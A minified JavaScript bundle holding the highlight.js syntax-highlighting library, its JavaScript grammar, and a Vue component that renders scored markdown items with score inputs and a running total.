ba(...e){return"("+(Vl(e).capture?"":"?:")+e.map(n=>ze(n)).join("|")+")"}function hs(e){return new RegExp(e.toString()+"|").exec("").length-1}function Ul(e,t){const a=e&&e.exec(t);return a&&a.index===0}const Jl=/\[(?:[^\\\]]|\\.)*\]|\(\??|\\([1-9][0-9]*)|\\./;function Ta(e,{joinWith:t}){let a=0;return e.map(n=>{a+=1;const s=a;let r=ze(n),p="";for(;r.length>0;){const o=Jl.exec(r);if(!o){p+=r;break}p+=r.substring(0,o.index),r=r.substring(o.index+o[0].length),o[0][0]==="\\"&&o[1]?p+="\\"+String(Number(o[1])+s):(p+=o[0],o[0]==="("&&a++)}return p}).map(n=>`(${n})`).join(t)}const Fl=/\b\B/,us="[a-zA-Z]\\w*",va="[a-zA-Z_]\\w*",Ws="\\b\\d+(\\.\\d+)?",gs="(-?)(\\b0[xX][a-fA-F0-9]+|(\\b\\d+(\\.\\d*)?|\\.\\d+)([eE][-+]?\\d+)?)",ks="\\b(0b[01]+)",Bl="!|!=|!==|%|%=|&|&&|&=|\\*|\\*=|\\+|\\+=|,|-|-=|/=|/|:|;|<<|<<=|<=|<|===|==|=|>>>=|>>=|>=|>>>|>>|>|\\?|\\[|\\{|\\(|\\^|\\^=|\\||\\|=|\\|\\||~",ql=(e={})=>{const t=/^#![ ]*\//;return e.binary&&(e.begin=Te(t,/.*\b/,e.binary,/\b.*/)),xe({scope:"meta",begin:t,end:/$/,relevance:0,"on:begin":(a,n)=>{a.index!==0&&n.ignoreMatch()}},e)},$e={begin:"\\\\[\\s\\S]",relevance:0},zl={scope:"string",begin:"'",end:"'",illegal:"\\n",contains:[$e]},$l={scope:"string",begin:'"',end:'"',illegal:"\\n",contains:[$e]},Gl={begin:/\b(a|an|the|are|I'm|isn't|don't|doesn't|won't|but|just|should|pretty|simply|enough|gonna|going|wtf|so|such|will|you|your|they|like|more)\b/},Pt=function(e,t,a={}){const n=xe({scope:"comment",begin:e,end:t,contains:[]},a);n.contains.push({scope:"doctag",begin:"[ ]*(?=(TODO|FIXME|NOTE|BUG|OPTIMIZE|HACK|XXX):)",end:/(TODO|FIXME|NOTE|BUG|OPTIMIZE|HACK|XXX):/,excludeBegin:!0,relevance:0});const s=ba("I","a","is","so","us","to","at","if","in","it","on",/[A-Za-z]+['](d|ve|re|ll|t|s|n)/,/[A-Za-z]+[-][a-z]+/,/[A-Za-z][a-z]{2,}/);return n.contains.push({begin:Te(/[ ]+/,"(",s,/[.]?[:]?([.][ ]|[ ])/,"){3}")}),n},Xl=Pt("//","$"),Kl=Pt("/\\*","\\*/"),Yl=Pt("#","$"),Ql={scope:"number",begin:Ws,relevance:0},Zl={scope:"number",begin:gs,relevance:0},ec={scope:"number",begin:ks,relevance:0},tc={scope:"regexp",begin:/\/(?=[^/\n]*\/)/,end:/\/[gimuy]*/,contains:[$e,{begin:/\[/,end:/\]/,relevance:0,contains:[$e]}]},ac={scope:"title",begin:us,relevance:0},nc={scope:"title",begin:va,relevance:0},sc={begin:"\\.\\s*"+va,relevance:0},rc=function(e){return Object.assign(e,{"on:begin":(t,a)=>{a.data._beginMatch=t[1]},"on:end":(t,a)=>{a.data._beginMatch!==t[1]&&a.ignoreMatch()}})};var rt=Object.freeze({__proto__:null,APOS_STRING_MODE:zl,BACKSLASH_ESCAPE:$e,BINARY_NUMBER_MODE:ec,BINARY_NUMBER_RE:ks,COMMENT:Pt,C_BLOCK_COMMENT_MODE:Kl,C_LINE_COMMENT_MODE:Xl,C_NUMBER_MODE:Zl,C_NUMBER_RE:gs,END_SAME_AS_BEGIN:rc,HASH_COMMENT_MODE:Yl,IDENT_RE:us,MATCH_NOTHING_RE:Fl,METHOD_GUARD:sc,NUMBER_MODE:Ql,NUMBER_RE:Ws,PHRASAL_WORDS_MODE:Gl,QUOTE_STRING_MODE:$l,REGEXP_MODE:tc,RE_STARTERS_RE:Bl,SHEBANG:ql,TITLE_MODE:ac,UNDERSCORE_IDENT_RE:va,UNDERSCORE_TITLE_MODE:nc});function pc(e,t){e.input[e.index-1]==="."&&t.ignoreMatch()}function oc(e,t){e.className!==void 0&&(e.scope=e.className,delete e.className)}function lc(e,t){t&&e.beginKeywords&&(e.begin="\\b("+e.beginKeywords.split(" ").join("|")+")(?!\\.)(?=\\b|\\s)",e.__beforeBegin=pc,e.keywords=e.keywords||e.beginKeywords,delete e.beginKeywords,e.relevance===void 0&&(e.relevance=0))}function cc(e,t){Array.isArray(e.illegal)&&(e.illegal=ba(...e.illegal))}function dc(e,t){if(e.match){if(e.begin||e.end)throw new Error("begin & end are not supported with match");e.begin=e.match,delete e.match}}function ic(e,t){e.relevance===void 0&&(e.relevance=1)}const xc=(e,t)=>{if(!e.beforeMatch)return;if(e.starts)throw new Error("beforeMatch cannot be used with starts");const a=Object.assign({},e);Object.keys(e).forEach(n=>{delete e[n]}),e.keywords=a.keywords,e.begin=Te(a.beforeMatch,fs(a.begin)),e.starts={relevance:0,contains:[Object.assign(a,{endsParent:!0})]},e.relevance=0,delete a.beforeMatch},yc=["of","and","for","in","not","or","if","then","parent","list","value"],wc="keyword";function ms(e,t,a=wc){const n=Object.create(null);return typeof e=="string"?s(a,e.split(" ")):Array.isArray(e)?s(a,e):Object.keys(e).forEach(function(r){Object.assign(n,ms(e[r],t,r))}),n;function s(r,p){t&&(p=p.map(o=>o.toLowerCase())),p.forEach(function(o){const l=o.split("|");n[l[0]]=[r,fc(l[0],l[1])]})}}function fc(e,t){return t?Number(t):hc(e)?0:1}function hc(e){return yc.includes(e.toLowerCase())}const cn={},ge=e=>{console.error(e)},dn=(e,...t)=>{console.log(`WARN: ${e}`,...t)},Pe=(e,t)=>{cn[`${e}/${t}`]||(console.log(`Deprecated as of ${e}. ${t}`),cn[`${e}/${t}`]=!0)},gt=new Error;function Ss(e,t,{key:a}){let n=0;const s=e[a],r={},p={};for(let o=1;o<=t.length;o++)p[o+n]=s[o],r[o+n]=!0,n+=hs(t[o-1]);e[a]=p,e[a]._emit=r,e[a]._multi=!0}function uc(e){if(Array.isArray(e.begin)){if(e.skip||e.excludeBegin||e.returnBegin)throw ge("skip, excludeBegin, returnBegin not compatible with beginScope: {}"),gt;if(typeof e.beginScope!="object"||e.beginScope===null)throw ge("beginScope must be object"),gt;Ss(e,e.begin,{key:"beginScope"}),e.begin=Ta(e.begin,{joinWith:""})}}function Wc(e){if(Array.isArray(e.end)){if(e.skip||e.excludeEnd||e.returnEnd)throw ge("skip, excludeEnd, returnEnd not compatible with endScope: {}"),gt;if(typeof e.endScope!="object"||e.endScope===null)throw ge("endScope must be object"),gt;Ss(e,e.end,{key:"endScope"}),e.end=Ta(e.end,{joinWith:""})}}function gc(e){e.scope&&typeof e.scope=="object"&&e.scope!==null&&(e.beginScope=e.scope,delete e.scope)}function kc(e){gc(e),typeof e.beginScope=="string"&&(e.beginScope={_wrap:e.beginScope}),typeof e.endScope=="string"&&(e.endScope={_wrap:e.endScope}),uc(e),Wc(e)}function mc(e){function t(p,o){return new RegExp(ze(p),"m"+(e.case_insensitive?"i":"")+(e.unicodeRegex?"u":"")+(o?"g":""))}class a{constructor(){this.matchIndexes={},this.regexes=[],this.matchAt=1,this.position=0}addRule(o,l){l.position=this.position++,this.matchIndexes[this.matchAt]=l,this.regexes.push([l,o]),this.matchAt+=hs(o)+1}compile(){this.regexes.length===0&&(this.exec=()=>null);const o=this.regexes.map(l=>l[1]);this.matcherRe=t(Ta(o,{joinWith:"|"}),!0),this.lastIndex=0}exec(o){this.matcherRe.lastIndex=this.lastIndex;const l=this.matcherRe.exec(o);if(!l)return null;const c=l.findIndex((f,y)=>y>0&&f!==void 0),i=this.matchIndexes[c];return l.splice(0,c),Object.assign(l,i)}}class n{constructor(){this.rules=[],this.multiRegexes=[],this.count=0,this.lastIndex=0,this.regexIndex=0}getMatcher(o){if(this.multiRegexes[o])return this.multiRegexes[o];const l=new a;return this.rules.slice(o).forEach(([c,i])=>l.addRule(c,i)),l.compile(),this.multiRegexes[o]=l,l}resumingScanAtSamePosition(){return this.regexIndex!==0}considerAll(){this.regexIndex=0}addRule(o,l){this.rules.push([o,l]),l.type==="begin"&&this.count++}exec(o){const l=this.getMatcher(this.regexIndex);l.lastIndex=this.lastIndex;let c=l.exec(o);if(this.resumingScanAtSamePosition()&&!(c&&c.index===this.lastIndex)){const i=this.getMatcher(0);i.lastIndex=this.lastIndex+1,c=i.exec(o)}return c&&(this.regexIndex+=c.position+1,this.regexIndex===this.count&&this.considerAll()),c}}function s(p){const o=new n;return p.contains.forEach(l=>o.addRule(l.begin,{rule:l,type:"begin"})),p.terminatorEnd&&o.addRule(p.terminatorEnd,{type:"end"}),p.illegal&&o.addRule(p.illegal,{type:"illegal"}),o}function r(p,o){const l=p;if(p.isCompiled)return l;[oc,dc,kc,xc].forEach(i=>i(p,o)),e.compilerExtensions.forEach(i=>i(p,o)),p.__beforeBegin=null,[lc,cc,ic].forEach(i=>i(p,o)),p.isCompiled=!0;let c=null;return typeof p.keywords=="object"&&p.keywords.$pattern&&(p.keywords=Object.assign({},p.keywords),c=p.keywords.$pattern,delete p.keywords.$pattern),c=c||/\w+/,p.keywords&&(p.keywords=ms(p.keywords,e.case_insensitive)),l.keywordPatternRe=t(c,!0),o&&(p.begin||(p.begin=/\B|\b/),l.beginRe=t(l.begin),!p.end&&!p.endsWithParent&&(p.end=/\B|\b/),p.end&&(l.endRe=t(l.end)),l.terminatorEnd=ze(l.end)||"",p.endsWithParent&&o.terminatorEnd&&(l.terminatorEnd+=(p.end?"|":"")+o.terminatorEnd)),p.illegal&&(l.illegalRe=t(p.illegal)),p.contains||(p.contains=[]),p.contains=[].concat(...p.contains.map(function(i){return Sc(i==="self"?p:i)})),p.contains.forEach(function(i){r(i,l)}),p.starts&&r(p.starts,o),l.matcher=s(l),l}if(e.compilerExtensions||(e.compilerExtensions=[]),e.contains&&e.contains.includes("self"))throw new Error("ERR: contains `self` is not supported at the top-level of a language.  See documentation.");return e.classNameAliases=xe(e.classNameAliases||{}),r(e)}function bs(e){return e?e.endsWithParent||bs(e.starts):!1}function Sc(e){return e.variants&&!e.cachedVariants&&(e.cachedVariants=e.variants.map(function(t){return xe(e,{variants:null},t)})),e.cachedVariants?e.cachedVariants:bs(e)?xe(e,{starts:e.starts?xe(e.starts):null}):Object.isFrozen(e)?xe(e):e}var bc="11.11.1";class Tc extends Error{constructor(t,a){super(t),this.name="HTMLInjectionError",this.html=a}}const Jt=ws,xn=xe,yn=Symbol("nomatch"),vc=7,Ts=function(e){const t=Object.create(null),a=Object.create(null),n=[];let s=!0;const r="Could not find the language '{}', did you forget to load/include a language module?",p={disableAutodetect:!0,name:"Plain text",contains:[]};let o={ignoreUnescapedHTML:!1,throwUnescapedHTML:!1,noHighlightRe:/^(no-?highlight)$/i,languageDetectRe:/\blang(?:uage)?-([\w-]+)\b/i,classPrefix:"hljs-",cssSelector:"pre code",languages:null,__emitter:Hl};function l(h){return o.noHighlightRe.test(h)}function c(h){let m=h.className+" ";m+=h.parentNode?h.parentNode.className:"";const T=o.languageDetectRe.exec(m);if(T){const M=F(T[1]);return M||(dn(r.replace("{}",T[1])),dn("Falling back to no-highlight mode for this block.",h)),M?T[1]:"no-highlight"}return m.split(/\s+/).find(M=>l(M)||F(M))}function i(h,m,T){let M="",D="";typeof m=="object"?(M=h,T=m.ignoreIllegals,D=m.language):(Pe("10.7.0","highlight(lang, code, ...args) has been deprecated."),Pe("10.7.0",`Please use highlight(code, options) instead.
https://github.com/highlightjs/highlight.js/issues/2277`),D=h,M=m),T===void 0&&(T=!0);const q={code:M,language:D};ve("before:highlight",q);const ee=q.result?q.result:f(q.language,q.code,T);return ee.code=q.code,ve("after:highlight",ee),ee}function f(h,m,T,M){const D=Object.create(null);function q(W,k){return W.keywords[k]}function ee(){if(!C.keywords){B.addText(A);return}let W=0;C.keywordPatternRe.lastIndex=0;let k=C.keywordPatternRe.exec(A),P="";for(;k;){P+=A.substring(W,k.index);const O=pe.case_insensitive?k[0].toLowerCase():k[0],z=q(C,O);if(z){const[ce,Ns]=z;if(B.addText(P),P="",D[O]=(D[O]||0)+1,D[O]<=vc&&(tt+=Ns),ce.startsWith("_"))P+=k[0];else{const Ls=pe.classNameAliases[ce]||ce;re(k[0],Ls)}}else P+=k[0];W=C.keywordPatternRe.lastIndex,k=C.keywordPatternRe.exec(A)}P+=A.substring(W),B.addText(P)}function fe(){if(A==="")return;let W=null;if(typeof C.subLanguage=="string"){if(!t[C.subLanguage]){B.addText(A);return}W=f(C.subLanguage,A,!0,Oa[C.subLanguage]),Oa[C.subLanguage]=W._top}else W=u(A,C.subLanguage.length?C.subLanguage:null);C.relevance>0&&(tt+=W.relevance),B.__addSublanguage(W._emitter,W.language)}function Z(){C.subLanguage!=null?fe():ee(),A=""}function re(W,k){W!==""&&(B.startScope(k),B.addText(W),B.endScope())}function Ca(W,k){let P=1;const O=k.length-1;for(;P<=O;){if(!W._emit[P]){P++;continue}const z=pe.classNameAliases[W[P]]||W[P],ce=k[P];z?re(ce,z):(A=ce,ee(),A=""),P++}}function Pa(W,k){return W.scope&&typeof W.scope=="string"&&B.openNode(pe.classNameAliases[W.scope]||W.scope),W.beginScope&&(W.beginScope._wrap?(re(A,pe.classNameAliases[W.beginScope._wrap]||W.beginScope._wrap),A=""):W.beginScope._multi&&(Ca(W.beginScope,k),A="")),C=Object.create(W,{parent:{value:C}}),C}function Ra(W,k,P){let O=Ul(W.endRe,P);if(O){if(W["on:end"]){const z=new pn(W);W["on:end"](k,z),z.isMatchIgnored&&(O=!1)}if(O){for(;W.endsParent&&W.parent;)W=W.parent;return W}}if(W.endsWithParent)return Ra(W.parent,k,P)}function Rs(W){return C.matcher.regexIndex===0?(A+=W[0],1):(Lt=!0,0)}function Ms(W){const k=W[0],P=W.rule,O=new pn(P),z=[P.__beforeBegin,P["on:begin"]];for(const ce of z)if(ce&&(ce(W,O),O.isMatchIgnored))return Rs(k);return P.skip?A+=k:(P.excludeBegin&&(A+=k),Z(),!P.returnBegin&&!P.excludeBegin&&(A=k)),Pa(P,W),P.returnBegin?0:k.length}function Os(W){const k=W[0],P=m.substring(W.index),O=Ra(C,W,P);if(!O)return yn;const z=C;C.endScope&&C.endScope._wrap?(Z(),re(k,C.endScope._wrap)):C.endScope&&C.endScope._multi?(Z(),Ca(C.endScope,W)):z.skip?A+=k:(z.returnEnd||z.excludeEnd||(A+=k),Z(),z.excludeEnd&&(A=k));do C.scope&&B.closeNode(),!C.skip&&!C.subLanguage&&(tt+=C.relevance),C=C.parent;while(C!==O.parent);return O.starts&&Pa(O.starts,W),z.returnEnd?0:k.length}function _s(){const W=[];for(let k=C;k!==pe;k=k.parent)k.scope&&W.unshift(k.scope);W.forEach(k=>B.openNode(k))}let et={};function Ma(W,k){const P=k&&k[0];if(A+=W,P==null)return Z(),0;if(et.type==="begin"&&k.type==="end"&&et.index===k.index&&P===""){if(A+=m.slice(k.index,k.index+1),!s){const O=new Error(`0 width match regex (${h})`);throw O.languageName=h,O.badRule=et.rule,O}return 1}if(et=k,k.type==="begin")return Ms(k);if(k.type==="illegal"&&!T){const O=new Error('Illegal lexeme "'+P+'" for mode "'+(C.scope||"<unnamed>")+'"');throw O.mode=C,O}else if(k.type==="end"){const O=Os(k);if(O!==yn)return O}if(k.type==="illegal"&&P==="")return A+=`
`,1;if(Nt>1e5&&Nt>k.index*3)throw new Error("potential infinite loop, way more iterations than matches");return A+=P,P.length}const pe=F(h);if(!pe)throw ge(r.replace("{}",h)),new Error('Unknown language: "'+h+'"');const Es=mc(pe);let Et="",C=M||Es;const Oa={},B=new o.__emitter(o);_s();let A="",tt=0,he=0,Nt=0,Lt=!1;try{if(pe.__emitTokens)pe.__emitTokens(m,B);else{for(C.matcher.considerAll();;){Nt++,Lt?Lt=!1:C.matcher.considerAll(),C.matcher.lastIndex=he;const W=C.matcher.exec(m);if(!W)break;const k=m.substring(he,W.index),P=Ma(k,W);he=W.index+P}Ma(m.substring(he))}return B.finalize(),Et=B.toHTML(),{language:h,value:Et,relevance:tt,illegal:!1,_emitter:B,_top:C}}catch(W){if(W.message&&W.message.includes("Illegal"))return{language:h,value:Jt(m),illegal:!0,relevance:0,_illegalBy:{message:W.message,index:he,context:m.slice(he-100,he+100),mode:W.mode,resultSoFar:Et},_emitter:B};if(s)return{language:h,value:Jt(m),illegal:!1,relevance:0,errorRaised:W,_emitter:B,_top:C};throw W}}function y(h){const m={value:Jt(h),illegal:!1,relevance:0,_top:p,_emitter:new o.__emitter(o)};return m._emitter.addText(h),m}function u(h,m){m=m||o.languages||Object.keys(t);const T=y(h),M=m.filter(F).filter(Ze).map(Z=>f(Z,h,!1));M.unshift(T);const D=M.sort((Z,re)=>{if(Z.relevance!==re.relevance)return re.relevance-Z.relevance;if(Z.language&&re.language){if(F(Z.language).supersetOf===re.language)return 1;if(F(re.language).supersetOf===Z.language)return-1}return 0}),[q,ee]=D,fe=q;return fe.secondBest=ee,fe}function g(h,m,T){const M=m&&a[m]||T;h.classList.add("hljs"),h.classList.add(`language-${M}`)}function b(h){let m=null;const T=c(h);if(l(T))return;if(ve("before:highlightElement",{el:h,language:T}),h.dataset.highlighted){console.log("Element previously highlighted. To highlight again, first unset `dataset.highlighted`.",h);return}if(h.children.length>0&&(o.ignoreUnescapedHTML||(console.warn("One of your code blocks includes unescaped HTML. This is a potentially serious security risk."),console.warn("https://github.com/highlightjs/highlight.js/wiki/security"),console.warn("The element with unescaped HTML:"),console.warn(h)),o.throwUnescapedHTML))throw new Tc("One of your code blocks includes unescaped HTML.",h.innerHTML);m=h;const M=m.textContent,D=T?i(M,{language:T,ignoreIllegals:!0}):u(M);h.innerHTML=D.value,h.dataset.highlighted="yes",g(h,T,D.language),h.result={language:D.language,re:D.relevance,relevance:D.relevance},D.secondBest&&(h.secondBest={language:D.secondBest.language,relevance:D.secondBest.relevance}),ve("after:highlightElement",{el:h,result:D,text:M})}function I(h){o=xn(o,h)}const le=()=>{Y(),Pe("10.6.0","initHighlighting() deprecated.  Use highlightAll() now.")};function K(){Y(),Pe("10.6.0","initHighlightingOnLoad() deprecated.  Use highlightAll() now.")}let se=!1;function Y(){function h(){Y()}if(document.readyState==="loading"){se||window.addEventListener("DOMContentLoaded",h,!1),se=!0;return}document.querySelectorAll(o.cssSelector).forEach(b)}function Q(h,m){let T=null;try{T=m(e)}catch(M){if(ge("Language definition for '{}' could not be registered.".replace("{}",h)),s)ge(M);else throw M;T=p}T.name||(T.name=h),t[h]=T,T.rawDefinition=m.bind(null,e),T.aliases&&Qe(T.aliases,{languageName:h})}function J(h){delete t[h];for(const m of Object.keys(a))a[m]===h&&delete a[m]}function we(){return Object.keys(t)}function F(h){return h=(h||"").toLowerCase(),t[h]||t[a[h]]}function Qe(h,{languageName:m}){typeof h=="string"&&(h=[h]),h.forEach(T=>{a[T.toLowerCase()]=m})}function Ze(h){const m=F(h);return m&&!m.disableAutodetect}function Rt(h){h["before:highlightBlock"]&&!h["before:highlightElement"]&&(h["before:highlightElement"]=m=>{h["before:highlightBlock"](Object.assign({block:m.el},m))}),h["after:highlightBlock"]&&!h["after:highlightElement"]&&(h["after:highlightElement"]=m=>{h["after:highlightBlock"](Object.assign({block:m.el},m))})}function Mt(h){Rt(h),n.push(h)}function Ot(h){const m=n.indexOf(h);m!==-1&&n.splice(m,1)}function ve(h,m){const T=h;n.forEach(function(M){M[T]&&M[T](m)})}function _t(h){return Pe("10.7.0","highlightBlock will be removed entirely in v12.0"),Pe("10.7.0","Please use highlightElement now."),b(h)}Object.assign(e,{highlight:i,highlightAuto:u,highlightAll:Y,highlightElement:b,highlightBlock:_t,configure:I,initHighlighting:le,initHighlightingOnLoad:K,registerLanguage:Q,unregisterLanguage:J,listLanguages:we,getLanguage:F,registerAliases:Qe,autoDetection:Ze,inherit:xn,addPlugin:Mt,removePlugin:Ot}),e.debugMode=function(){s=!1},e.safeMode=function(){s=!0},e.versionString=bc,e.regex={concat:Te,lookahead:fs,either:ba,optional:Il,anyNumberOfTimes:jl};for(const h in rt)typeof rt[h]=="object"&&ys(rt[h]);return Object.assign(e,rt),e},_e=Ts({});_e.newInstance=()=>Ts({});var Cc=_e;_e.HighlightJS=_e;_e.default=_e;const Ft=Nn(Cc),wn="[A-Za-z$_][0-9A-Za-z$_]*",Pc=["as","in","of","if","for","while","finally","var","new","function","do","return","void","else","break","catch","instanceof","with","throw","case","default","try","switch","continue","typeof","delete","let","yield","const","class","debugger","async","await","static","import","from","export","extends","using"],Rc=["true","false","null","undefined","NaN","Infinity"],vs=["Object","Function","Boolean","Symbol","Math","Date","Number","BigInt","String","RegExp","Array","Float32Array","Float64Array","Int8Array","Uint8Array","Uint8ClampedArray","Int16Array","Int32Array","Uint16Array","Uint32Array","BigInt64Array","BigUint64Array","Set","Map","WeakSet","WeakMap","ArrayBuffer","SharedArrayBuffer","Atomics","DataView","JSON","Promise","Generator","GeneratorFunction","AsyncFunction","Reflect","Proxy","Intl","WebAssembly"],Cs=["Error","EvalError","InternalError","RangeError","ReferenceError","SyntaxError","TypeError","URIError"],Ps=["setInterval","setTimeout","clearInterval","clearTimeout","require","exports","eval","isFinite","isNaN","parseFloat","parseInt","decodeURI","decodeURIComponent","encodeURI","encodeURIComponent","escape","unescape"],Mc=["arguments","this","super","console","window","document","localStorage","sessionStorage","module","global"],Oc=[].concat(Ps,vs,Cs);function _c(e){const t=e.regex,a=(T,{after:M})=>{const D="</"+T[0].slice(1);return T.input.indexOf(D,M)!==-1},n=wn,s={begin:"<>",end:"</>"},r=/<[A-Za-z0-9\\._:-]+\s*\/>/,p={begin:/<[A-Za-z0-9\\._:-]+/,end:/\/[A-Za-z0-9\\._:-]+>|\/>/,isTrulyOpeningTag:(T,M)=>{const D=T[0].length+T.index,q=T.input[D];if(q==="<"||q===","){M.ignoreMatch();return}q===">"&&(a(T,{after:D})||M.ignoreMatch());let ee;const fe=T.input.substring(D);if(ee=fe.match(/^\s*=/)){M.ignoreMatch();return}if((ee=fe.match(/^\s+extends\s+/))&&ee.index===0){M.ignoreMatch();return}}},o={$pattern:wn,keyword:Pc,literal:Rc,built_in:Oc,"variable.language":Mc},l="[0-9](_?[0-9])*",c=`\\.(${l})`,i="0|[1-9](_?[0-9])*|0[0-7]*[89][0-9]*",f={className:"number",variants:[{begin:`(\\b(${i})((${c})|\\.)?|(${c}))[eE][+-]?(${l})\\b`},{begin:`\\b(${i})\\b((${c})\\b|\\.)?|(${c})\\b`},{begin:"\\b(0|[1-9](_?[0-9])*)n\\b"},{begin:"\\b0[xX][0-9a-fA-F](_?[0-9a-fA-F])*n?\\b"},{begin:"\\b0[bB][0-1](_?[0-1])*n?\\b"},{begin:"\\b0[oO][0-7](_?[0-7])*n?\\b"},{begin:"\\b0[0-7]+n?\\b"}],relevance:0},y={className:"subst",begin:"\\$\\{",end:"\\}",keywords:o,contains:[]},u={begin:".?html`",end:"",starts:{end:"`",returnEnd:!1,contains:[e.BACKSLASH_ESCAPE,y],subLanguage:"xml"}},g={begin:".?css`",end:"",starts:{end:"`",returnEnd:!1,contains:[e.BACKSLASH_ESCAPE,y],subLanguage:"css"}},b={begin:".?gql`",end:"",starts:{end:"`",returnEnd:!1,contains:[e.BACKSLASH_ESCAPE,y],subLanguage:"graphql"}},I={className:"string",begin:"`",end:"`",contains:[e.BACKSLASH_ESCAPE,y]},K={className:"comment",variants:[e.COMMENT(/\/\*\*(?!\/)/,"\\*/",{relevance:0,contains:[{begin:"(?=@[A-Za-z]+)",relevance:0,contains:[{className:"doctag",begin:"@[A-Za-z]+"},{className:"type",begin:"\\{",end:"\\}",excludeEnd:!0,excludeBegin:!0,relevance:0},{className:"variable",begin:n+"(?=\\s*(-)|$)",endsParent:!0,relevance:0},{begin:/(?=[^\n])\s/,relevance:0}]}]}),e.C_BLOCK_COMMENT_MODE,e.C_LINE_COMMENT_MODE]},se=[e.APOS_STRING_MODE,e.QUOTE_STRING_MODE,u,g,b,I,{match:/\$\d+/},f];y.contains=se.concat({begin:/\{/,end:/\}/,keywords:o,contains:["self"].concat(se)});const Y=[].concat(K,y.contains),Q=Y.concat([{begin:/(\s*)\(/,end:/\)/,keywords:o,contains:["self"].concat(Y)}]),J={className:"params",begin:/(\s*)\(/,end:/\)/,excludeBegin:!0,excludeEnd:!0,keywords:o,contains:Q},we={variants:[{match:[/class/,/\s+/,n,/\s+/,/extends/,/\s+/,t.concat(n,"(",t.concat(/\./,n),")*")],scope:{1:"keyword",3:"title.class",5:"keyword",7:"title.class.inherited"}},{match:[/class/,/\s+/,n],scope:{1:"keyword",3:"title.class"}}]},F={relevance:0,match:t.either(/\bJSON/,/\b[A-Z][a-z]+([A-Z][a-z]*|\d)*/,/\b[A-Z]{2,}([A-Z][a-z]+|\d)+([A-Z][a-z]*)*/,/\b[A-Z]{2,}[a-z]+([A-Z][a-z]+|\d)*([A-Z][a-z]*)*/),className:"title.class",keywords:{_:[...vs,...Cs]}},Qe={label:"use_strict",className:"meta",relevance:10,begin:/^\s*['"]use (strict|asm)['"]/},Ze={variants:[{match:[/function/,/\s+/,n,/(?=\s*\()/]},{match:[/function/,/\s*(?=\()/]}],className:{1:"keyword",3:"title.function"},label:"func.def",contains:[J],illegal:/%/},Rt={relevance:0,match:/\b[A-Z][A-Z_0-9]+\b/,className:"variable.constant"};function Mt(T){return t.concat("(?!",T.join("|"),")")}const Ot={match:t.concat(/\b/,Mt([...Ps,"super","import"].map(T=>`${T}\\s*\\(`)),n,t.lookahead(/\s*\(/)),className:"title.function",relevance:0},ve={begin:t.concat(/\./,t.lookahead(t.concat(n,/(?![0-9A-Za-z$_(])/))),end:n,excludeBegin:!0,keywords:"prototype",className:"property",relevance:0},_t={match:[/get|set/,/\s+/,n,/(?=\()/],className:{1:"keyword",3:"title.function"},contains:[{begin:/\(\)/},J]},h="(\\([^()]*(\\([^()]*(\\([^()]*\\)[^()]*)*\\)[^()]*)*\\)|"+e.UNDERSCORE_IDENT_RE+")\\s*=>",m={match:[/const|var|let/,/\s+/,n,/\s*/,/=\s*/,/(async\s*)?/,t.lookahead(h)],keywords:"async",className:{1:"keyword",3:"title.function"},contains:[J]};return{name:"JavaScript",aliases:["js","jsx","mjs","cjs"],keywords:o,exports:{PARAMS_CONTAINS:Q,CLASS_REFERENCE:F},illegal:/#(?![$_A-z])/,contains:[e.SHEBANG({label:"shebang",binary:"node",relevance:5}),Qe,e.APOS_STRING_MODE,e.QUOTE_STRING_MODE,u,g,b,I,K,{match:/\$\d+/},f,F,{scope:"attr",match:n+t.lookahead(":"),relevance:0},m,{begin:"("+e.RE_STARTERS_RE+"|\\b(case|return|throw)\\b)\\s*",keywords:"return throw case",relevance:0,contains:[K,e.REGEXP_MODE,{className:"function",begin:h,returnBegin:!0,end:"\\s*=>",contains:[{className:"params",variants:[{begin:e.UNDERSCORE_IDENT_RE,relevance:0},{className:null,begin:/\(\s*\)/,skip:!0},{begin:/(\s*)\(/,end:/\)/,excludeBegin:!0,excludeEnd:!0,keywords:o,contains:Q}]}]},{begin:/,/,relevance:0},{match:/\s+/,relevance:0},{variants:[{begin:s.begin,end:s.end},{match:r},{begin:p.begin,"on:begin":p.isTrulyOpeningTag,end:p.end}],subLanguage:"xml",contains:[{begin:p.begin,end:p.end,skip:!0,contains:["self"]}]}]},Ze,{beginKeywords:"while if switch catch for"},{begin:"\\b(?!function)"+e.UNDERSCORE_IDENT_RE+"\\([^()]*(\\([^()]*(\\([^()]*\\)[^()]*)*\\)[^()]*)*\\)\\s*\\{",returnBegin:!0,label:"func.def",contains:[J,e.inherit(e.TITLE_MODE,{begin:n,className:"title.function"})]},{match:/\.\.\./,relevance:0},ve,{match:"\\$"+n,relevance:0},{match:[/\bconstructor(?=\s*\()/],className:{1:"title.function"},contains:[J]},Ot,Rt,we,_t,{match:/\$[(.]/}]}}const Dc={name:"componentMarkdown",props:{data:{type:Array}},setup(e){const t=_a([...e.data]),a=_a(0),n=new ds;Ft.registerLanguage("javascript",_c);const s=(r,p)=>{Number(r.target.value||0)>p.score&&(r.target.value=p.scoring||""),p.scoring=Number(r.target.value||0)};return n.use(Ol({langPrefix:"hljs language-",gfm:!0,tables:!1,breaks:!0,pedantic:!0,highlight(r,p){const o=Ft.getLanguage(p)?p:"javascript";return Ft.highlight(r,{language:o}).value}})),Hs(()=>t,r=>{var o;let p=0;(o=r.value)==null||o.forEach(l=>{p=p+(l.scoring||0)}),a.value=p},{deep:!0}),()=>{var p;if(!e.data||!((p=e.data)!=null&&p.length))return G("div",[G("span","暂无数据")]);const r=t.value.map(o=>{const l=n.parse(o.text);return G("div",{class:"main-box_inner"},[G("div",{class:"inner-head"},[G("h4",{class:"head-title"},o.title),G("div",{class:"head-re"},[G("span",{class:"head-score"},`${o.score} 分`),G("input",{class:"head-statistics",type:"number",step:1,onInput:c=>s(c,o)})])]),/<details.*?>/i.test(l)?G("div",{class:"inner-content ",innerHTML:l}):G("details",{class:"inner-content ",innerHTML:l})])});return G("div",{class:"main-box"},[...r,G("div",{class:"content-scoring"},[G("span",{},"总得分："),G("span",{class:"scoring-num"},a.value)])])}}};export{Dc as _,Ac as g,Lc as s};
